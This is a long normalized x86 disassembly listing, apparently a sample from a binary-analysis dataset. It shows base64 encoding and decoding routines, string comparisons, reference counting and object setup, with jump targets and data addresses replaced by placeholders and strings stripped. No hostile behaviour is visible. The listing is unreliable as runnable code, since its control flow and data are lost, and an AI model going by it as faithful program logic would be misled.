mov al [ ebp + 0x14 ]
mov [ esi + 0x44 ] al
mov [ esi + 0x45 ] 0x0
mov eax esi
call sub_425e4c
retn 0x10
sub_40561a
cmp [ ecx + 0x18 ] 0x10
push ebx
mov ebx [ ecx + 0x14 ]
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x14 ]
push ecx
call sub_404ccb
neg eax
sbb eax eax
inc eax
pop ebx
retn
sub_40563c
mov ecx [ esp + 0x4 ]
push ebx
push esi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push [ esp + 0xc ]
mov edx [ eax + 0x14 ]
sub ecx esi
mov ebx ecx
call sub_404ccb
neg eax
sbb eax eax
pop esi
inc eax
pop ebx
retn
sub_405664
cmp [ ecx + 0x18 ] 0x10
push ebx
mov ebx [ ecx + 0x14 ]
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x14 ]
push ecx
call sub_404ccb
xor ecx ecx
test eax eax
setl cl
mov al cl
pop ebx
retn
sub_4056ae
push 0x14
mov eax sub_43a99e
call sub_425dad
and [ ebp - 0x20 ] 0x0
mov esi ecx
mov ebx edx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] ebx
call sub_403dae
and [ ebp - 0x4 ] 0x0
mov edi [ ebx + 0x14 ]
lea eax [ edi + edi ]
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1c ] edi
call sub_40592c
and [ ebp - 0x10 ] 0x0
test edi edi
jbe r-xdata
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn
mov esi rw-data
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov eax ebx
call sub_403eaa
mov al [ eax ]
sar al 0x2
and al 0x3f
movsx edi al
mov eax esi
call sub_403eaa
movzx eax [ eax ]
mov edi [ ebp - 0x14 ]
xor ebx ebx
push eax
inc ebx
call sub_403fc6
mov edi [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
call sub_403eaa
mov bl [ eax ]
and bl 0x3
shl bl 0x4
inc edi
mov [ ebp - 0x10 ] edi
cmp edi [ ebp - 0x1c ]
jae r-xdata
movsx edi bl
mov eax esi
call sub_403eaa
movzx eax [ eax ]
mov edi [ ebp - 0x14 ]
xor ebx ebx
push eax
inc ebx
call sub_403fc6
mov edi [ ebp - 0x10 ]
cmp edi [ ebp - 0x1c ]
jae r-xdata
mov eax [ ebp - 0x18 ]
call sub_403eaa
mov al [ eax ]
sar al 0x4
and al 0xf
or bl al
inc edi
mov [ ebp - 0x10 ] edi
push 0x3d
mov eax [ ebp - 0x18 ]
call sub_403eaa
mov bl [ eax ]
and bl 0xf
shl bl 0x2
inc edi
mov [ ebp - 0x10 ] edi
cmp edi [ ebp - 0x1c ]
jae r-xdata
push 0x3d
mov eax [ ebp - 0x18 ]
call sub_403eaa
mov al [ eax ]
and al 0x3f
movsx edi al
mov eax esi
call sub_403eaa
movzx eax [ eax ]
push eax
jmp r-xdata
movsx edi bl
mov eax esi
call sub_403eaa
movzx eax [ eax ]
push eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
call sub_403eaa
mov al [ eax ]
sar al 0x6
and al 0x3
or bl al
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
xor ebx ebx
inc ebx
call sub_403fc6
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov edi [ ebp - 0x14 ]
xor ebx ebx
inc ebx
call sub_403fc6
mov edi [ ebp - 0x10 ]
cmp edi [ ebp - 0x1c ]
jae r-xdata
sub_405808
push 0x18
mov eax sub_43a96a
call sub_425dad
and [ ebp - 0x24 ] 0x0
mov ebx edx
mov edi [ ebx + 0x14 ]
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x20 ] edi
call sub_403dae
and [ ebp - 0x4 ] 0x0
mov eax edi
mov [ ebp - 0x24 ] 0x1
call sub_40592c
xor esi esi
test edi edi
jbe r-xdata
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn
jmp r-xdata
mov edi esi
mov eax ebx
call sub_403eaa
movzx eax [ eax ]
mov bl [ eax * 4 + rw-data ]
mov eax [ ebp - 0x10 ]
inc esi
mov edi esi
call sub_403eaa
movzx eax [ eax ]
mov al [ eax * 4 + rw-data ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x1c ] al
sar al 0x4
shl bl 0x2
and al 0x3
or al bl
mov [ ebp - 0x18 ] al
push [ ebp - 0x18 ]
xor ebx ebx
inc ebx
call sub_403fc6
inc esi
cmp esi [ ebp - 0x20 ]
jae r-xdata
inc esi
cmp esi [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
call sub_403eaa
cmp [ eax ] 0x3d
je r-xdata
inc esi
cmp esi [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
call sub_403eaa
cmp [ eax ] 0x3d
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_403eaa
movzx eax [ eax ]
mov al [ eax * 4 + rw-data ]
mov edi [ ebp - 0x14 ]
mov cl al
mov [ ebp - 0x18 ] al
mov al [ ebp - 0x1c ]
sar cl 0x2
and cl 0xf
shl al 0x4
or cl al
mov [ ebp - 0x1c ] cl
push [ ebp - 0x1c ]
call sub_403fc6
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_403eaa
movzx eax [ eax ]
mov cl [ eax * 4 + rw-data ]
mov al [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
shl al 0x6
or al cl
mov [ ebp - 0x18 ] al
push [ ebp - 0x18 ]
call sub_403fc6
sub_40592c
push edi
mov edi [ esi + 0x14 ]
cmp edi eax
ja r-xdata
pop edi
retn
cmp [ esi + 0x18 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_4044ac
test al al
je r-xdata
push edi
mov ecx esi
call sub_404490
sub_405951
push ebp
sub esp 0x58
push 0x118
mov eax sub_43b60f
call sub_425dad
mov [ ebp + 0x54 ] ecx
xor edi edi
mov [ ebp + 0x58 ] edi
cmp [ ecx + 0x8 ] edi
je r-xdata
mov [ ecx + 0x10 ] 0x0
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
mov esi [ ebp + 0x64 ]
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x88 ]
cmp [ eax + 0x14 ] edi
push edi
sete [ ebp + 0x67 ]
xor ebx ebx
inc ebx
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x124 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x10
push r--data
lea ecx [ ebp - 0xec ]
mov [ ebp + 0x58 ] ebx
call sub_403dc1
mov edi rw-data
push edi
lea ecx [ ebp - 0x124 ]
push ecx
lea ecx [ ebp - 0xec ]
mov [ ebp - 0x4 ] 0x11
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp + 0x58 ] 0x3
call [ eax + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp + 0x54 ]
mov edi r--data
push edi
lea ecx [ ebp + 0x1c ]
mov [ eax + 0x10 ] bl
call sub_403dc1
push edi
lea ecx [ ebp ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push 0x0
push ebx
lea ecx [ ebp + 0x38 ]
mov [ ebp + 0x67 ] al
call sub_40415f
push 0x0
push ebx
lea ecx [ ebp ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
mov [ ebp + 0x67 ] bl
push r--data
lea ecx [ ebp - 0xb4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x12
push r--data
lea ecx [ ebp - 0x7c ]
mov [ ebp + 0x58 ] 0x7
call sub_403dc1
push edi
lea ecx [ ebp - 0xb4 ]
push ecx
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x13
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp + 0x58 ] 0xf
call [ eax + 0x50 ]
test al al
jne r-xdata
push edi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push edi
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push 0x0
push ebx
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push 0x0
push ebx
lea ecx [ ebp ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
mov eax [ ebp + 0x54 ]
mov eax [ eax + 0x8 ]
mov edi [ eax ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x6c ]
push eax
mov eax [ ebp + 0x54 ]
mov ecx [ eax + 0x8 ]
jmp r-xdata
test [ ebp + 0x58 ] 0x100
je r-xdata
and [ ebp + 0x58 ] 0xfffffdff
push esi
push ebx
lea ecx [ ebp - 0xd0 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x44 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x14
push r--data
lea ecx [ ebp - 0x108 ]
mov [ ebp + 0x58 ] 0x1f
call sub_403dc1
push edi
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x4 ] 0x15
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp + 0x58 ] 0x3f
call [ eax + 0x50 ]
test al al
jne r-xdata
push edi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push edi
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x9
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push 0x0
push ebx
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push 0x0
push ebx
lea ecx [ ebp ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
push 0x2
jmp r-xdata
call [ edi + 0x4 ]
jmp r-xdata
test [ ebp + 0x58 ] 0x80
je r-xdata
and [ ebp + 0x58 ] 0xfffffeff
push esi
push ebx
lea ecx [ ebp - 0x60 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x98 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x16
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp + 0x58 ] 0x7f
call sub_403dc1
push edi
lea ecx [ ebp - 0x98 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x17
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp + 0x58 ] 0xff
call [ eax + 0x50 ]
test al al
jne r-xdata
push edi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push edi
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xb
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xc
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push 0x0
push ebx
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push 0x0
push ebx
lea ecx [ ebp ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
push 0x4
jmp r-xdata
mov ebx [ ebp + 0x54 ]
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x6c ]
mov ecx [ ebx + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x5c
leave
retn 0x4
test [ ebp + 0x58 ] 0x40
je r-xdata
and [ ebp + 0x58 ] 0xffffff7f
push esi
push ebx
lea ecx [ ebp - 0x28 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x18
push r--data
lea ecx [ ebp - 0xd0 ]
mov [ ebp + 0x58 ] 0x1ff
call sub_403dc1
push edi
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] 0x19
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp + 0x58 ] 0x3ff
call [ eax + 0x50 ]
mov [ ebp + 0x67 ] 0x0
test al al
je r-xdata
push edi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push edi
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xe
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xf
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
xor edi edi
push edi
push ebx
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push edi
push ebx
lea ecx [ ebp ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
je r-xdata
push 0x8
jmp r-xdata
test [ ebp + 0x58 ] 0x20
je r-xdata
and [ ebp + 0x58 ] 0xffffffbf
push esi
push ebx
lea ecx [ ebp - 0x98 ]
call sub_40415f
xor esi esi
test [ ebp + 0x58 ] 0x200
je r-xdata
mov eax [ ebp + 0x54 ]
mov [ eax + 0x10 ] 0x0
jmp r-xdata
push 0x10
test [ ebp + 0x58 ] 0x10
je r-xdata
and [ ebp + 0x58 ] 0xffffffdf
push esi
push ebx
lea ecx [ ebp - 0x108 ]
call sub_40415f
test [ ebp + 0x58 ] 0x8
je r-xdata
and [ ebp + 0x58 ] 0xffffffef
push esi
push ebx
lea ecx [ ebp - 0x44 ]
call sub_40415f
test [ ebp + 0x58 ] 0x4
je r-xdata
and [ ebp + 0x58 ] 0xfffffff7
push esi
push ebx
lea ecx [ ebp - 0x7c ]
call sub_40415f
test [ ebp + 0x58 ] 0x2
je r-xdata
and [ ebp + 0x58 ] 0xfffffffb
push esi
push ebx
lea ecx [ ebp - 0xb4 ]
call sub_40415f
test [ ebp + 0x58 ] bl
je r-xdata
and [ ebp + 0x58 ] 0xfffffffd
push esi
push ebx
lea ecx [ ebp - 0xec ]
call sub_40415f
cmp [ ebp + 0x67 ] 0x0
mov ecx [ ebp + 0x54 ]
setne al
mov [ ecx + 0x10 ] al
jmp r-xdata
push esi
push ebx
lea ecx [ ebp - 0x124 ]
call sub_40415f
sub_405f06
push 0x5c
mov eax sub_43c233
call sub_425dad
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ ecx + 0x10 ] bl
je r-xdata
call sub_425e4c
retn 0x4
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] 0x1
call sub_403dc1
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
xor bl bl
mov [ ebp - 0x10 ] 0x3
call sub_41ed6b
mov esi eax
xor ebx ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
sub_40602d
push 0x0
mov eax sub_43a781
call sub_425dad
mov edi [ ebp + 0x8 ]
push 0x0
mov ecx edi
call sub_42303e
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
call sub_403dae
lea esi [ edi + 0x20 ]
call sub_403dae
lea esi [ edi + 0x3c ]
call sub_403dae
lea esi [ edi + 0x58 ]
call sub_403dae
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x4
push edi
call sub_422f88
pop ecx
pop ecx
mov eax edi
call sub_425e4c
retn 0x8
sub_406082
push 0x0
mov eax sub_43a781
call sub_425dad
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x4
call sub_422e1f
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x58 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x3c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x20 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_423066
call sub_425e4c
retn 0x4
sub_4060e2
push 0x4
mov eax sub_43a7bf
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_423871
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_403de3
mov eax esi
call sub_425e4c
retn 0x4
sub_40611c
push ebp
mov ebp esp
push ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42303e
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_423066
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_40614d
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42303e
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_423066
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_406175
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42303e
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_423066
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_4061ec
mov ecx [ eax ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
retn
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_422d1c
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
retn
sub_40621a
push 0xa8
mov eax sub_43b456
call sub_425dad
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_425e4c
retn
cmp [ esi ] edi
jne r-xdata
push 0x18
call sub_4246c6
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] edi
cmp ebx edi
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4061cf
push eax
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x10 ] 0x1
call sub_40602d
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x10 ] 0x3
mov [ ebx + 0x4 ] edi
mov [ ebx ] r--data
call sub_4231dd
lea edi [ ebx + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
pop ecx
xor edi edi
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xb4 ]
push eax
call sub_406082
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] ebx
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
sub_4062de
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jge r-xdata
push [ esi + 0x10 ]
call sub_424869
jmp r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_42491d
pop ecx
sub_40631f
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_4230d0
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_40635e
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_42323d
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_4063ac
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_424139
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x10
call sub_423d5c
sub_4063e1
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x28 ]
pop ebp
retn 0x10
sub_406400
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_424139
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x14
call sub_423d5c
sub_40644a
push 0x0
mov eax sub_43b418
call sub_425dad
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_4237f0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_403de3
mov [ esi ] r--data
mov eax esi
call sub_425e4c
retn 0x8
sub_406490
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43c722
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
and ecx 0x17
mov [ eax + 0x8 ] ecx
mov eax [ eax + 0xc ]
and eax ecx
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test al 0x4
je r-xdata
push ebx
push ebx
push 0x2
pop ebx
test bl al
je r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call sub_403dc1
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0xa8 ] ebx
call sub_40644a
push r--data
lea eax [ esp + 0x2c ]
push r--data
lea ecx [ esp + 0x54 ]
call sub_403dc1
lea eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x70 ]
push eax
mov [ esp + 0xa8 ] ebx
call sub_40644a
push r--data
lea eax [ esp + 0x70 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x10 ]
call sub_403dc1
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0xa8 ] 0x1
call sub_40644a
push r--data
lea eax [ esp + 0x2c ]
jmp r-xdata
call sub_42597b
push eax
jmp r-xdata
sub_4065de
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_422c43
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_406630
push 0x20
mov eax sub_43df39
call sub_425dad
mov edi [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x10 ]
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
call sub_40ac2c
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
lea eax [ edi + 0x44c ]
push eax
mov [ edi ] r--data
mov [ edi + 0x4 ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0xc ] r--data
mov [ edi + 0x444 ] ebx
mov [ edi + 0x448 ] ebx
call sub_40f0f4
mov [ edi + 0x468 ] esi
lea esi [ edi + 0x46c ]
call sub_403dae
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x10 ]
mov [ edi + 0x488 ] bl
mov [ edi + 0x489 ] bl
mov [ edi + 0x48a ] 0x1
mov [ edi + 0x48b ] 0x1
mov [ edi + 0x48c ] ebx
mov [ edi + 0x490 ] ebx
call sub_4049dd
push 0xffffffff
push ebx
lea eax [ edi + 0x64 ]
push eax
lea ecx [ edi + 0x1fc ]
call sub_40400a
mov ecx edi
call sub_406790
mov eax edi
call sub_425e4c
retn 0xc
sub_40670b
push 0x4
mov eax sub_43def3
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov eax esi
mov [ ebp - 0x4 ] 0x2
call sub_4086ce
mov ecx [ esi + 0x444 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x448 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x0
push 0x1
lea ecx [ esi + 0x46c ]
call sub_40415f
lea eax [ esi + 0x44c ]
call sub_416fc8
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_40af95
call sub_425e4c
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_406790
push 0x3c
mov eax sub_43dd3e
call sub_425dad
mov esi ecx
push 0x60
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push esi
push eax
call sub_41a0c2
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push r--data
lea ecx [ ebp - 0x48 ]
mov [ esi + 0x444 ] eax
call sub_403dc1
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_403dc1
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
mov esi [ esi + 0x16c ]
push eax
call sub_412aeb
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
call sub_425e4c
retn
sub_40681c
push ebp
mov ebp esp
